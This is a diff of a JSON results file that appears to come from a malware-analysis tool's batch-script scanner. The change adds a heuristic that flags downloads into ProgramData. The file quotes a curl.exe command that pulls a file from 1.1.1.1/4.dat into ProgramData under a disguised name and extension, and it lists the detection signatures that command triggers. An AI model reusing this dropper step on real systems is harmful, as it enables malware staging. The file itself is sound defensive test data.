@@ -1,7 +1,7 @@
 {
   "extra": {
     "drop_file": false,
-    "score": 460,
+    "score": 710,
     "sections": [
       {
         "auto_collapse": false,
@@ -64,12 +64,61 @@
                 "1.1.1.1"
               ],
               "uri": [
-                "1.1.1.1/4.dat"
+                "http://1.1.1.1/4.dat"
+              ],
+              "uri_path": [
+                "/4.dat"
               ]
             }
           }
         },
         "title_text": "External file download in batch script",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": true,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 5,
+          "score": 250,
+          "score_map": {
+            "downloaded_file_to_different_extension": 0,
+            "downloaded_file_to_different_name": 0,
+            "downloads_file_to_programdata": 250
+          },
+          "signatures": {
+            "downloaded_file_to_different_extension": 1,
+            "downloaded_file_to_different_name": 1,
+            "downloads_file_to_programdata": 1
+          }
+        },
+        "tags": {
+          "file": {
+            "path": [
+              "C:\\ProgramData\\Pterds\\HErtop.pos"
+            ]
+          },
+          "network": {
+            "static": {
+              "ip": [
+                "1.1.1.1"
+              ],
+              "uri": [
+                "http://1.1.1.1/4.dat"
+              ],
+              "uri_path": [
+                "/4.dat"
+              ]
+            }
+          }
+        },
+        "title_text": "http://1.1.1.1/4.dat",
         "zeroize_on_tag_safe": false
       },
       {
@@ -118,6 +167,15 @@
       },
       {
         "attack_ids": [],
+        "heur_id": 5,
+        "signatures": [
+          "downloads_file_to_programdata",
+          "downloaded_file_to_different_name",
+          "downloaded_file_to_different_extension"
+        ]
+      },
+      {
+        "attack_ids": [],
         "heur_id": 6,
         "signatures": []
       }
@@ -132,11 +190,31 @@
           "value": "curl.exe -o C:\\ProgramData\\Pterds\\HErtop.pos 1.1.1.1/4.dat"
         }
       ],
+      "file.path": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "C:\\ProgramData\\Pterds\\HErtop.pos"
+        }
+      ],
       "network.static.ip": [
         {
           "heur_id": 5,
           "signatures": [
             "complex_one_liner"
+          ],
+          "value": "1.1.1.1"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
           ],
           "value": "1.1.1.1"
         }
@@ -147,7 +225,34 @@
           "signatures": [
             "complex_one_liner"
           ],
-          "value": "1.1.1.1/4.dat"
+          "value": "http://1.1.1.1/4.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "http://1.1.1.1/4.dat"
+        }
+      ],
+      "network.static.uri_path": [
+        {
+          "heur_id": 5,
+          "signatures": [
+            "complex_one_liner"
+          ],
+          "value": "/4.dat"
+        },
+        {
+          "heur_id": 5,
+          "signatures": [
+            "downloads_file_to_programdata",
+            "downloaded_file_to_different_name",
+            "downloaded_file_to_different_extension"
+          ],
+          "value": "/4.dat"
         }
       ]
     },
